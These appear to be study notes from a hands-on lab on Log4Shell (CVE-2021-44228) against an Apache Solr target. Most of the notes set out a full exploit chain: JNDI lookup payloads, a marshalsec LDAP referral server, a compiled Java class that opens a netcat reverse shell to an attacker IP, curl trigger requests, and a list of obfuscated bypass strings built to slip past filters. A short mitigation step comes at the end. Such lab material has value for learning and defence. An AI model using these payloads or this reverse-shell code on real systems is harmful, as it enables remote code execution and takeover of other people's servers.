
For a growing community-supported list of software and services vulnerable to CVE-2021-44228, check out this GitHub repository:

	https://github.com/YfryTchsGD/Log4jAttackSurface

Some examples of this syntax are:

	${sys:os.name}
	${sys:user.name}
	${log4j:configParentLocation}
	${ENV:PATH}
	${ENV:HOSTNAME}
	${java:version}

The format of the usual syntax that takes advantage of this looks like so:

	${jndi:ldap://ATTACKERCONTROLLEDHOST}

or

	foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}

This syntax indicates that the log4j will invoke functionality from "JNDI", or the "Java Naming and Directory Interface."
Ultimately, this can be used to access external resources, or "references," which is what is weaponized in this attack. 

Notice the ldap:// schema. This indicates that the target will reach out to an endpoint (an attacker controlled location, in the case of this attack) 
via the LDAP protocol. For the sake of brevity, we will not need to cover all the ins-and-outs and details of LDAP here, 
but know that this is something we will need to work with as we refine our attack.



locations you might supply this JNDI syntax:

	Input boxes, user and password login forms, data entry points within applications
	HTTP headers such as User-Agent, X-Forwarded-For, or other customizable headers
	Any place for user-supplied data



Example:
	
	Setup netcat listener:
		$ nc -lnvp 9999


	Make a curl request with JNDI payload:
		$ curl 'http://10.10.197.201:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999\}'


----------------------------------------------------------------------------------------------------------------------------------------------------------

Exploition:


We will utilize a open-source and public utility to stage an "LDAP Referral Server". This will be used to essentially redirect the initial request of the victim to
another location, where you can host a secondary payload that will ultimately run code on the target. This breaks down like so:

	1.${jndi:ldap://attackerserver:1389/Resource} -> reaches out to our LDAP Referral Server
	2.LDAP Referral Server springboards the request to a secondary http://attackerserver/resource
	3.The victim retrieves and executes the code present in http://attackerserver/resource

This means we will need an HTTP server, which we could simply host with any of the following options (serving on port 8000):

	python3 -m http.server



The first order of business however is obtaining the LDAP Referral Server. We will use the marshalsec utility offered at https://github.com/mbechler/marshalsec

Ultimately, this needs to run Java. Reviewing the README for this utility, it suggests using Java 8.
(You may or may not have success using a different version, but to "play by the rules," we will match the same version of Java used on the target virtual machine)

We must build marshalsec with the Java builder maven. If you do not yet have maven on your system, you can install it through your package manage
(sudo apt install maven)

Next, run the command to build the marshalsec utility:

cd /{path to marshalsec}

mvn clean package -DskipTests


Start LDAP Server:
	
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"


Now that our LDAP server is ready and waiting, we can open a second terminal window to prepare and our final payload and secondary HTTP server.


Save the Java exploit code & change to use your IP:

public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}


Compile Java exploit code:

javac Exploit.java


Host the exploit Java file via HTTP:

python3 -m http.server


Your payload is created and compiled, it is hosted with an HTTP server in one terminal, your LDAP referral server is up and waiting in another terminal -- 
next prepare a netcat listener to catch your reverse shell in yet another new terminal window:

nc -lnvp 9999


Finally, all that is left to do is trigger the exploit and fire off our JNDI syntax!
Note the changes in port number (now referring to our LDAP server) and the resource we retrieve, specifying our exploit:

curl 'http://10.10.106.171:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'


And last in your netcat listener you will get a shell from victim machine

_____________________________________________________________________________________________________________________________________________________________

Bypass

There are numerous resources online that showcase some examples of these bypasses, with a few offered below:


${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/}

Note the use of the rmi:// protocol in the last one. This is also another valid technique that can be used with the marshalsec utility -- feel free to experiment!

For other techniques, you are strongly encouraged t do your own research. There is a significant amount of information being shared in this 
Reddit thread: https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/



___________________________________________________________________________________________________________________________________________________________


Mitigation


Finding the solr.in.sh file:

locate solr.in.sh

/etc/default/solr.in.sh

Scroll to the bottom of the file, and add a new line with the above syntax. Save and close the file. (you may need sudo permission)

SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"

Restart solr service

sudo /etc/init.d/solr restart
